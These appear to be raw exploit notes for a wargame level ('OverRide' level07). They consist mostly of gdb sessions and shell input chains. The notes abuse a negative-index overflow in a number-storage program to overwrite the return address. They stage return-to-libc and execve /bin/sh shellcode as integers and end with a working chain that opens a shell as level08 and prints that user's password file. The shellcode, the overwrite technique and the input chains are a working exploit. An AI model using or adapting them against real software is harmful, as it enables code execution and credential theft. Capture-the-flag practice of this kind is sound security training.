-2147483648 = minimum int

# Let's find where store_number is returning:
=> 0x80486d6 <store_number+166>:	ret
(gdb) x/x $esp
0xffffd51c:	0x080488ef <-- We must find this address in the stack, this is where
							store_number will return

(gdb) b *0x080486d5
(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483669"' ; python -c 'print "quit"')
Breakpoint 1, 0x080486d5 in store_number ()

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x80000020
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0x080488ef <- HERE, WE MUST OVERWRITE HERE
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714

# After some tries to find the right value to put in index, we got this
														  0xa7a7a7a7

(gdb) r < <(python -c 'print "store"' ; python -c 'print "2812782503"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"')

(gdb) x/100wx $esp
0xffffd4f0:	0x08048add	0xffffd544	0x00000000	0xf7e2b6c0
0xffffd500:	0xffffd708	0xf7ff0a50	0xa7a7a7a7	0x7ffffff6
0xffffd510:	0x00000000	0xffffdfdc	0xffffd708	0xa7a7a7a7 <- VALUE HAS CHANGED
0xffffd520:	0xffffd544	0x00000014	0xf7fcfac0	0xf7fdc714
(gdb) si
0x080486d6 in store_number ()
(gdb) si
0xa7a7a7a7 in ?? () # Nice, we can control EIP now :)

(gdb) info func system
0xf7e6aed0  system -> 4159090384

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

(gdb) x/wx 0xffffd540+12
0xffffd54c:	0xf7e6aed0

"\x68\x58\x7c\xea\xB7"+ "\x68\x58\x7c\xea\xB7"+ "\x68\xd0\xae\xe6\xf7\xC3"

=========ALL===========

0:  68 ec 97 f8 f7          push   0xf7f897ec
5:  68 ec 97 f8 f7          push   0xf7f897ec
a:  68 d0 ae e6 f7          push   0xf7e6aed0 0xf7e6aed0
f:  c3                      ret

68 ec 97 f8 = f8 97 ec 68 = 4170706024
f7 68 ec 97 = 97 ec 68 f7 = 2548852983
f8 f7 68 d0 = d0 68 f7 f8 = 3496540152
ae e6 f7 c3 = c3 f7 e6 ae = 3287803566

======/BIN/SH========
0:  68 ec 97 f8 f7          push   0xf7f897ec

F8 97 EC 68 = 4170706024
00 00 00 F7 = 247

======SYSTEM=======

0:  68 d0 ae e6 f7          push   0xf7e6aed0
5:  c3                      ret

E6 AE D0 68 = 3870216296
00 00 C3 F7 = 50167

=====FINAL======

(gdb) r < <(python -c 'print "store"' ; python -c 'print "3870216296"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "50167"' ; python -c 'print "1"' ; python -c 'print "quit"')

Breakpoint 1, 0x080486d5 in store_number ()
(gdb) x/2i 0xffffd544
   0xffffd544:	push   $0xf7e6aed0
   0xffffd549:	ret

(gdb) r < <(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "quit"')
(gdb) x/3i 0xffffd544
   0xffffd544:	push   $0xf7f897ec
   0xffffd549:	push   $0xf7f897ec
   0xffffd54e:	push   $0xd0

(gdb) r < <(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803558"' ; python -c 'print "-2147483645"'  ; python -c 'print "quit"')
(gdb) x/4i 0xffffd544 # 4294956356
   0xffffd544:	push   $0xf7f897ec
   0xffffd549:	push   $0xf7f897ec
   0xffffd54e:	push   $0xf7e6a6d0
   0xffffd553:	ret

r < <(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803566"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "4294956356"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"')





========================== NEW SHELLCODE ======================================

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80

(gdb) x/10i 0xffffd544
   0xffffd544:	xor    eax,eax
   0xffffd546:	push   eax
   0xffffd547:	push   0x68732f2f
   0xffffd54c:	push   0x6e69622f
   0xffffd551:	mov    ebx,esp
   0xffffd553:	push   eax
   0xffffd554:	push   ebx
   0xffffd555:	mov    ecx,esp
   0xffffd557:	mov    al,0xb
   0xffffd559:	int    0x80


68 50 c0 31 = 1750122545
# 31 c0 50 68 = 834687080
python -c 'print "store"' ; python -c 'print "834687080"' ; python -c 'print "-2147483648"' #0

68 73 2f 2f = 1752379183
# 2f 2f 73 68 = 791638888
python -c 'print "store"' ; python -c 'print "791638888"' ; python -c 'print "1"' #1

69 62 2f 68 = 1768092264 1768042344
# 68 2f 62 69 = 1747935849
python -c 'print "store"' ; python -c 'print "1747935849"' ; python -c 'print "2"' #2

50 e3 89 6e = 1357089134
# 6e 89 e3 50 = 1854530384
python -c 'print "store"' ; python -c 'print "1854530384"' ; python -c 'print "-2147483645" #3

b0 e1 89 53 = 2967570771
# 53 89 e1 b0 = 1401545136
python -c 'print "store"' ; python -c 'print "1401545136"' ; python -c 'print "4" #4

00 80 cd 0b = 8441099
# 0b cd 80 00 = 773504
python -c 'print "store"' ; python -c 'print "773504"' ; python -c 'print "5" #5

# To control EIP
python -c 'print "4294956356"' ; python -c 'print "-2147483658"'

r < <(python -c 'print "store"' ; python -c 'print "1750122545"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "1752379183"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "1768092264"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "1357089134"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "2160921344"' ; python -c 'print "5"' ; python -c 'print "4294956356"' ; python -c 'print "-2147483658"')

(gdb) r < <(python -c 'print "store"' ; python -c 'print "1750122545"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "1752379183"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "1768092264"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "1357089134"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956356"' ; python -c 'print "-2147483658"')


r < <(python -c 'print "store"' ; python -c 'print "1750122545"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "1752379183"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "1768092264"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "1357089134"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956404"' ; python -c 'print "-2147483658"')

# GDB ENV ???

134514927 <- MUST FIND

08048930 <- real env GREATER
080488ef <- gdb env

0x41 ; 65 difference

level07@OverRide:~$ (python -c 'print "read"' ; python -c 'print "-2147483658"' ; python -c 'print "quit"') | ./level07
(python -c 'print "read"' ; python -c 'print "-9"' ; python -c 'print "quit"') | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Index:  Number at data[4294967287] is 4294956388
 Completed read command successfully

➜  override git:(master) ✗ printf "%x\n" 4294956388
-> ffffd564 this is the address of our shellcode

(python -c 'print "store"' ; python -c 'print "4170706024"' ; python -c 'print "-2147483648"' ; python -c 'print "store"' ; python -c 'print "2548852983"' ; python -c 'print "1"' ; python -c 'print "store"' ; python -c 'print "3496540152"' ; python -c 'print "2"' ; python -c 'print "store"' ; python -c 'print "3287803566"' ; python -c 'print "-2147483645"' ; python -c 'print "store"' ; python -c 'print "2967570771"' ; python -c 'print "4"' ; python -c 'print "store"' ; python -c 'print "8441099"' ; python -c 'print "5"' ; python -c 'print "store"' ; python -c 'print "4294956388"' ; python -c 'print "-2147483658"' ; cat) | ./level07

Input command:  Number:  Index: whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
